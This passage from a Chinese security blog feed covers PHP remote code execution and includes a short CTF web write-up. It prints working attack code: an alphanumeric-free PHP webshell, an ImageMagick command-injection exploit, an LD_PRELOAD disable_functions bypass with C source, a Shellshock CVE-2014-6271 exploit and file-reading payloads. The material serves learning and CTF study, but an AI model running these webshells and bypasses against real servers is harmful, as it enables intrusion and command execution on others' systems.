alt></p><p>这个方法同时利用了PHP弱类型,因为要获取<code>&#39;和&#39;{2}</code>，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故<code>true+true==2</code>，也就是<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2</code>。</p><p><strong>利用自增运算符</strong></p><p>先学习一下下面这个知识点</p><blockquote><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串</p><p>PHP函数是大小写不敏感的 </p></blockquote><p><img src="https://www.leavesongs.com/media/attachment/2017/02/17/a386505b-1c14-48f0-88cb-66923770df33.8732f996cd67.jpg" alt></p><p>也就是说，<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>，<code>&#39;b&#39;++ =&gt; &#39;c&#39;</code>… 所以，我们只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。</p><pre class=" language-PHP"><code class="language-PHP"><?php$_=[];$_=@"$_"; // $_='Array';$_=$_['!'=='@']; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]);?></code></pre><p><img src="https://www.leavesongs.com/media/attachment/2017/02/17/d92e3d40-a451-4fc4-a516-e0747b721c69.jpg" alt></p><h2 id="6-绕过字符限制getshell"><a href="#6-绕过字符限制getshell" class="headerlink" title="6)绕过字符限制getshell"></a>6)绕过字符限制getshell</h2><p>知识点</p><ul><li>ip进制转换后是等价</li></ul><pre class=" language-python"><code class="language-python">ip <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span><span class="token comment" spellcheck="true"># 十六进制</span><span class="token keyword">print</span> <span class="token string">'0x'</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                   <span class="token keyword">for</span> i <span class="token keyword">in</span> ip<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 长整数</span><span class="token keyword">print</span> int<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                   <span class="token keyword">for</span> i <span class="token keyword">in</span> ip<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 八进制</span><span class="token keyword">print</span> <span class="token string">'0'</span> <span class="token operator">+</span> oct<span class="token punctuation">(</span>int<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                   <span class="token keyword">for</span> i <span class="token keyword">in</span> ip<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><ul><li>利用续行符拆分命令成多行</li></ul><p><img src="https://p5.ssl.qhimg.com/t01d2eac72941e42be9.png" alt></p><p><img src="https://p4.ssl.qhimg.com/t016294d3a767429eab.png" alt></p><p>dir命令和ls命令差不多.但是dir在alphabetical序中靠前,二是按列输出不换行</p><p>rev命令的作用是反转文件每一行的内容</p><h2 id="7-绕过disable-function"><a href="#7-绕过disable-function" class="headerlink" title="7)绕过disable_function"></a>7)绕过disable_function</h2><p>一般来说，最简单的绕过disable_function的办法，dl函数，proc_open函数，漏洞版本的imagemagic等</p><p>但是绕过这个点的话,一直以来都是许多安全研究员的主要方向,可以说是姿势很多.</p><p><strong>利用系统组件绕过</strong>,这里就直接搬别人的笔记过来</p><h3 id="1-利用window-com组件"><a href="#1-利用window-com组件" class="headerlink" title="1)利用window com组件"></a>1)利用window com组件</h3><p>php 5.4版本. 大于这个版本的需要自己添加扩展</p><p><img src="https://img2018.cnblogs.com/blog/1545399/201905/1545399-20190529112614451-922493076.png" alt></p><p>解决办法 删除System32目录下的wshom.ocx文件</p><h3 id="2-利用ImageMagick漏洞"><a href="#2-利用ImageMagick漏洞" class="headerlink" title="2)利用ImageMagick漏洞"></a>2)利用ImageMagick漏洞</h3><p><img src="https://img2018.cnblogs.com/blog/1545399/201905/1545399-20190529143616706-2088599156.png" alt></p><p>如果给了PHPINFO信息,如果存在以上内容,就可以尝试利用这个点来绕过</p><pre class=" language-PHP"><code class="language-PHP"><?phpecho "Disable Functions: " . ini_get('disable_functions') . "\n";$command = PHP_SAPI == 'cli' ? $argv[1] : $_GET['cmd'];if ($command == '') {    $command = 'id';}$exploit = <<<EOFpush graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/image.jpg"|$command")'pop graphic-contextEOF;file_put_contents("KKKK.mvg", $exploit);$thumb = new Imagick();$thumb->readImage('KKKK.mvg');$thumb->writeImage('KKKK.png');$thumb->clear();$thumb->destroy();unlink("KKKK.mvg");unlink("KKKK.png");?></code></pre><h3 id="3-利用环境变量LD-PRELOAD"><a href="#3-利用环境变量LD-PRELOAD" class="headerlink" title="3)利用环境变量LD_PRELOAD"></a>3)利用环境变量LD_PRELOAD</h3><p>php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的</p><p>LD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的</p><pre class=" language-PHP"><code class="language-PHP">#include<stdlib.h>#include <stdio.h>#include<string.h>void payload(){         FILE*fp = fopen("/tmp/2.txt","w");         fclose(fp);         system("mkdir /var/www/html/test"); }int geteuid(){  FILE *fp1=fopen("/tmp/2.txt","r");  if(fp1!=NULL)  {   fclose(fp1);         return 552;        }else {         payload();         return 552;       }}</code></pre><p>执行命令编译为一个动态共享库</p><pre><code>gcc -c -fPIC a.c -o agcc -shared a -o a.so</code></pre><p>通过putenv来设置LD_PRELOAD，让我们的程序优先被调用。在webshell上用mail函数发送一封邮件来触发。结果为</p><pre class=" language-PHP"><code class="language-PHP"><?php   putenv("LD_PRELOAD=/var/www/html/a.so");   mail("[email protected]","","","","");  ?></code></pre><p><img src="https://img2018.cnblogs.com/blog/1545399/201905/1545399-20190529145914202-1141401503.png" alt></p><p>所以要学好C语言,不然后面一些阶段,尤其是内网写shellcode的时候</p><p>所以我打算寒假学一下<strong>Windows核心编程</strong></p><h3 id="4-CVE-2014-6271"><a href="#4-CVE-2014-6271" class="headerlink" title="4)CVE-2014-6271"></a>4)CVE-2014-6271</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token shell-comment comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span><span class="token shell-comment comment"># Google Dork: none </span><span class="token shell-comment comment"># Date: 10/31/2014 </span><span class="token shell-comment comment"># Exploit Author: Ryan King (Starfall) </span><span class="token shell-comment comment"># Vendor Homepage: http:</span><span class="token comment" spellcheck="true">//php.net </span><span class="token shell-comment comment"># Software Link: http:</span><span class="token comment" spellcheck="true">//php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span><span class="token shell-comment comment"># Version: 5.* (tested on 5.6.2) </span><span class="token shell-comment comment"># Tested on: Debian 7 and CentOS 5 and 6 </span><span class="token shell-comment comment"># CVE: CVE-2014-6271 </span><span class="token keyword">function</span> <span class="token function">shellshock</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// Execute a command via CVE-2014-6271 @mail.c:283 </span>   <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">tempnam</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"PHP_LOL=() { x; }; $cmd >$tmp 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// In Safe Mode, the user may only alter environment variableswhose names </span>   <span class="token comment" spellcheck="true">// begin with the prefixes supplied by this directive. </span>   <span class="token comment" spellcheck="true">// By default, users will only be able to set environment variablesthat </span>   <span class="token comment" spellcheck="true">// begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, </span>   <span class="token comment" spellcheck="true">// PHP will let the user modify ANY environment variable! </span>   <span class="token function">mail</span><span class="token punctuation">(</span><span class="token string">"a@127.0.0.1"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">"-bv"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// -bv so we don't actuallysend any mail </span>   <span class="token variable">$output</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$output</span> <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token string">"No output, or not vuln."</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">echo</span> <span class="token function">shellshock</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><h2 id="08-无参数命令执行"><a href="#08-无参数命令执行" class="headerlink" title="08)无参数命令执行"></a>08)无参数命令执行</h2><p>主要思路: 函数套用即<code>a(b());</code>这种形式,而在正则表达式中与之对应的就是<code>\((?R)?\)</code></p><p>还是先来总结一下相关的函数把.读取目录用<code>scandir()</code>函数就行了,这个函数的返回值是以<code>数组形式</code>返回的,因此在读取相关的文件时候,可以使用<strong>数组指针的形式进行指向需要读取的文件</strong></p><p>关于PHP数组</p><blockquote><p>PHP 中的数组实际上是一个有序映射。映射是一种把 <em>values</em>   关联到 <em>keys</em> 的类型。此类型在很多方面做了优化，因此可以把它当成真正的数组，或列表（向量），散列表（是映射的一种实现），字典，集合，栈，队列以及更多可能性。由于数组元素的值也可以是另一个数组，树形结构和多维数组也是允许的。 </p></blockquote><p><img src="https://i.loli.net/2020/01/23/o1YUclwqrthSnH9.png" alt></p><p>php中数组指向函数</p><p><img src="http://static.zybuluo.com/Pdsdt/bnn1qg7n9l8b3bw0vzv85zxb/image.png" alt></p><p>绕过<code>.</code> , <code>.</code>达到读取上层目录文件的目的</p><p><img src="http://static.zybuluo.com/Pdsdt/idhz48o1god8sbslcnliadwp/image.png" alt></p><p><img src="http://static.zybuluo.com/Pdsdt/dxuwv4t48eqwt7ysodnufye5/image.png" alt></p><p>这里<code>localeconv()</code>返回的第一个元素正好就是<code>.</code>,因此可以构造读取当前文件夹后的最后一个文件</p><pre><code>readfile(end(scandir(reset(localeconv()))));</code></pre><p>其他方法</p><pre><code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))) #46chrchr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))) #46</code></pre><p>如果文件在上一个目录.使用<code>chdir()</code>函数,但是这个函数返回结果只有0和1,故需要构造判断语句</p><p><img src="https://i.loli.net/2020/01/23/a4Vcj9dWOHCAGvD.png" alt></p><pre><code>if(chdir(next(scandir(pos(localeconv())))))readfile(end(scandir(pos(localeconv()))));# 使用chdir()函数，更改目录，返回1的同时，读取目录下的文件</code></pre><pre><code>echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));# 通过chdir修改当前目录，通过localtime()等函数构造chr（46）即“.”达到读取上层目录文件的目的</code></pre><p>例子1</p><p>字节CTF</p><pre class=" language-PHP"><code class="language-PHP">            $code = file_get_contents($url);            if (';' === preg_replace('/[a-z]+\((?R)?\)/', NULL, $code)) {                if (preg_match('/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $code)) {                    echo 'bye~';                } else {                    eval($code);                }            }        } else {            echo "error: host not allowed";        }    } else {        echo "error: invalid url";    }}else{    highlight_file(__FILE__);}</code></pre><p>官方wp</p><pre><code>echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))))))))));# 同样的原理，不过生成chr(46)的方式不同</code></pre><p>2019上海市大学生网络安全大赛_decade</p><pre class=" language-PHP"><code class="language-PHP"><?phphighlight_file(__FILE__);$code = $_GET['code'];if (!empty($code)) {        if (';' === preg_replace('/[a-z]+\((?R)?\)/', NULL, $code)) {        if (preg_match('/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $code)) {            echo 'bye~';                } else {                    eval($code);                }            }        else {            echo "invalid";        }}else {        echo "invalid";    }?></code></pre><p>这里正则过滤了更多东西,过滤了local就不能使用上面的方法来构造<code>.</code>了</p><pre><code>readfile(end(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))));</code></pre><p>因为<code>sqrt</code> 被过滤</p><pre><code>(ord(hebrevc(crypt(phpversion()))));</code></pre><pre><code>readgzfile(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))));</code></pre><p><strong>主要是对相关函数的功能要熟悉</strong></p><h1 id="0x05-漏洞防御"><a href="#0x05-漏洞防御" class="headerlink" title="0x05  漏洞防御"></a>0x05  漏洞防御</h1><ul><li>升级插件,框架最新版本</li><li>对用户的输入,尤其是一些变量存在的地方就行严格过滤或者禁用一些功能</li><li>谨慎使用危险函数</li></ul><h1 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06  总结"></a>0x06  总结</h1><p><strong>经常需要对payload中的不可见字符用url编码</strong></p><p>这篇总结是对PHP 的RCE一次总结,然而不光PHP有RCE,还有很多语言也有RCE漏洞,比如JAVA S2 045 这个漏洞影响有多大不用说了吧</p><p><a href="https://xz.aliyun.com/t/4607" target="_blank" rel="noopener">Struts2 历史RCE漏洞 EXP汇总 常用工具流量特征分析</a></p><p><a href="https://lorexxar.cn/2019/09/23/javaweb-S2/" target="_blank" rel="noopener">从零开始学java web - struts2 RCE分析</a></p><p>主要是平时遇见的少,实操就少了.正在尝试给服务器提供一个RCE的环境</p><h1 id="0x06-参考资料"><a href="#0x06-参考资料" class="headerlink" title="0x06  参考资料"></a>0x06  参考资料</h1><p>有一说一,网上关于RCE的基础讲解是真的少?其实是RCE一般比较难挖掘,并且出现也是在多个漏洞一起利用下(可能是大佬觉得没啥讲的,虽然intitle: RCE漏洞有3k+结果…加油吧</p><p>持续总结更新,遇见了就拿过来!</p><p><a href="https://www.freebuf.com/tag/rce%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">RCE漏洞专栏-Freebuf</a></p><p><a href="https://www.freebuf.com/tag/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C" target="_blank" rel="noopener">远程代码执行专栏-Freebuf</a></p><p><a href="https://blog.csdn.net/qq_41453285/article/details/100777421" target="_blank" rel="noopener">Web安全攻防:10—RCE（远程命令执行）漏洞介绍</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11396392.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/11396392.html</a></p><p><a href="https://www.anquanke.com/post/id/87203" target="_blank" rel="noopener">如何绕过四个字符限制getshell</a></p><p><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192052.html</a></p><p><a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175403</a></p><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">无字母数字webshell之提高篇</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a></p><p><a href="https://blog.csdn.net/whatday/article/details/100191703" target="_blank" rel="noopener">https://blog.csdn.net/whatday/article/details/100191703</a></p><p><a href="http://drops.xmd5.com/static/drops/tools-3786.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tools-3786.html</a></p><p><a href="https://evoa.me/index.php/archives/62/" target="_blank" rel="noopener">极客大挑战 RCE ME</a></p><p>绕过disable_function(目前对我来说有点难理解)</p><ul><li><a href="https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html" target="_blank" rel="noopener">https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html</a></li><li><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192052.html</a></li><li><a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175403</a></li><li><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></li><li><a href="https://xz.aliyun.com/t/4113" target="_blank" rel="noopener">https://xz.aliyun.com/t/4113</a></li><li><a href="https://mochazz.github.io/2018/09/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E7%BB%95%E8%BF%87PHP%E7%9A%84disable_functions/" target="_blank" rel="noopener">https://mochazz.github.io/2018/09/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E7%BB%95%E8%BF%87PHP%E7%9A%84disable_functions/</a></li><li><a href="https://blog.csdn.net/qq_17204441/article/details/90704743" target="_blank" rel="noopener">https://blog.csdn.net/qq_17204441/article/details/90704743</a></li><li><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" target="_blank" rel="noopener">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html</a></li></ul><p>无参数命令执行</p><p><a href="http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/#comment-15" target="_blank" rel="noopener">http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/#comment-15</a></p><p><a href="https://www.php.net/manual/zh/ref.array.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/ref.array.php</a></p><p>​                           <strong><em>“If you can dream it, you can do it.”</em></strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-前言背景&quot;&gt;&lt;a href=&quot;#0x00-前言背景&quot; class=&quot;headerlink&quot; title=&quot;0x00  前言背景&quot;&gt;&lt;/a&gt;0x00  前言背景&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系
      
    
    </summary>
    
    
      <category term="TOP10基础漏洞" scheme="https://hack-for.fun/categories/TOP10%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="RCE" scheme="https://hack-for.fun/tags/RCE/"/>
    
      <category term="webshell" scheme="https://hack-for.fun/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>HGAME CTF Web Writeup(Week 1)</title>
    <link href="https://hack-for.fun/posts/20200115/"/>
    <id>https://hack-for.fun/posts/20200115/</id>
    <published>2020-01-14T16:00:00.000Z</published>
    <updated>2020-02-12T02:46:22.878Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Cosmos-的博客"><a href="#Cosmos-的博客" class="headerlink" title="Cosmos 的博客"></a>Cosmos 的博客</h1><ul><li>Git源码泄露</li><li>Github常见功能掌握</li></ul><p><img src="https://i.loli.net/2020/01/26/cRjH4SWOFdnQiGN.png" alt></p><p><img src="https://i.loli.net/2020/01/17/CWain4XKMow9mGU.png" alt></p><p>通过相应的泄露了的网站URL;<code>http://cosmos.hgame.n3ko.co/.git/config,</code>我们找到了他的Github的仓库的地址</p><p><img src="https://i.loli.net/2020/01/17/1OjKu6WSxLUAwXT.png" alt></p><p><img src="https://i.loli.net/2020/01/17/xBW73DcYiZRhnCS.png" alt></p><p><img src="https://i.loli.net/2020/01/17/rqS74lKCjBdAvsu.png" alt></p><p>打开题目是这样,圈起来的就是提示.</p><p>base64 解码: aGdhbWV7ZzF0X2xlQGtfMXNfZGFuZ2VyMHVzXyEhISF9</p><p>得到flag</p><h1 id="接-头-霸-王"><a href="#接-头-霸-王" class="headerlink" title="接 头 霸 王"></a>接 头 霸 王</h1><ul><li>常见的HTTP请求伪造</li></ul><p>直接上py,方便的多</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> jsonurl <span class="token operator">=</span> <span class="token string">'http://kyaru.hgame.n3ko.co/'</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Referer'</span><span class="token punctuation">:</span><span class="token string">'https://vidar.club'</span><span class="token punctuation">,</span><span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Cosmos'</span><span class="token punctuation">,</span><span class="token string">'If-Unmodified-Since'</span><span class="token punctuation">:</span><span class="token string">'Fri, 01 Jan 2078 00:00:00 GMT'</span><span class="token punctuation">}</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p><img src="https://i.loli.net/2020/01/17/FcVqPw3Lvd4uJQb.png" alt></p><p>关于一个知识点,我都快忘了</p><blockquote><p><strong><code>If-Modified-Since</code></strong> 是一个条件式请求首部，服务器只在所请求的资源在给定的日期时间之后对内容进行过修改的情况下才会将资源返回，状态码为 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200" target="_blank" rel="noopener"><code>200</code></a>  。如果请求的资源从那时起未经修改，那么返回一个不带有消息主体的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/304" target="_blank" rel="noopener"><code>304</code></a>  响应，而在 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Last-Modified" target="_blank" rel="noopener"><code>Last-Modified</code></a> 首部中会带有上次修改时间。 不同于  <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Unmodified-Since" target="_blank" rel="noopener"><code>If-Unmodified-Since</code></a>, <code>If-Modified-Since</code> 只可以用在 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET" target="_blank" rel="noopener"><code>GET</code></a> 或 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/HEAD" target="_blank" rel="noopener"><code>HEAD</code></a> 请求中。</p><p>当与 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-None-Match" target="_blank" rel="noopener"><code>If-None-Match</code></a> 一同出现时，它（<strong><code>If-Modified-Since</code></strong>）会被忽略掉，除非服务器不支持 <code>If-None-Match</code>。</p><p>最常见的应用场景是来更新没有特定 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/ETag" target="_blank" rel="noopener"><code>ETag</code></a> 标签的缓存实体。</p><p>HTTP协议中的 <strong><code>If-Unmodified-Since</code></strong> 消息头用于请求之中，使得当前请求成为条件式请求：只有当资源在指定的时间之后没有进行过修改的情况下，服务器才会返回请求的资源，或是接受 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST" target="_blank" rel="noopener"><code>POST</code></a> 或其他 non-<a href="https://developer.mozilla.org/en-US/docs/Glossary/safe" target="_blank" rel="noopener">safe</a> 方法的请求。如果所请求的资源在指定的时间之后发生了修改，那么会返回 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/412" target="_blank" rel="noopener"><code>412</code></a> (Precondition Failed) 错误。</p><p>常见的应用场景有两种：</p><ul><li>与 non-<a href="https://developer.mozilla.org/en-US/docs/Glossary/safe" target="_blank" rel="noopener">safe</a> 方法如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST" target="_blank" rel="noopener"><code>POST</code></a> 搭配使用，可以用来<a href="https://en.wikipedia.org/wiki/Optimistic_concurrency_control" target="_blank" rel="noopener">优化并发控制</a>，例如在某些wiki应用中的做法：假如在原始副本获取之后，服务器上所存储的文档已经被修改，那么对其作出的编辑会被拒绝提交。</li><li>与含有 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Range" target="_blank" rel="noopener"><code>If-Range</code></a> 消息头的范围请求搭配使用，用来确保新的请求片段来自于未经修改的文档。</li></ul></blockquote><h1 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h1><p>我也不知道我做这道题的方法是不是题目的预期</p><ul><li><p>HTTP请求方法修改</p></li><li><p>URL编码知识</p><p>首先是解决重定向的问题. 我们直接在题目栏就开始抓包,即抓到最原始的包,</p><p>然后修改GET请求为POST请求,就会看到人鸡验证,然后我在bp里面提交参数没什么反应,于是拉到postman中进行提交</p></li></ul><p><img src="https://i.loli.net/2020/01/17/hD7P5gpruoqEI3X.png" alt></p><p><img src="https://i.loli.net/2020/01/17/yruniczjWQXFI7E.png" alt></p><p>这里注意要对+号进行URL编码,因为在URL里面+可以被当做空格处理</p><h1 id="尼泰玫"><a href="#尼泰玫" class="headerlink" title="尼泰玫"></a>尼泰玫</h1><ul><li>套路题,抓包修改得分得flag</li><li>或者改前端的JS</li></ul><p><img src="https://i.loli.net/2020/01/17/vGuOCdjXJL3hRmz.png" alt></p><p>希望后面能有更多有意思的题目,学到更多的东西</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Cosmos-的博客&quot;&gt;&lt;a href=&quot;#Cosmos-的博客&quot; class=&quot;headerlink&quot; title=&quot;Cosmos 的博客&quot;&gt;&lt;/a&gt;Cosmos 的博客&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;Git源码泄露&lt;/li&gt;
&lt;li&gt;Github常见功能掌握&lt;/l
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://hack-for.fun/categories/Writeup/"/>
    
    
  </entry>
  
  <entry>
    <title>一篇文章深入学习变量覆盖漏洞</title>
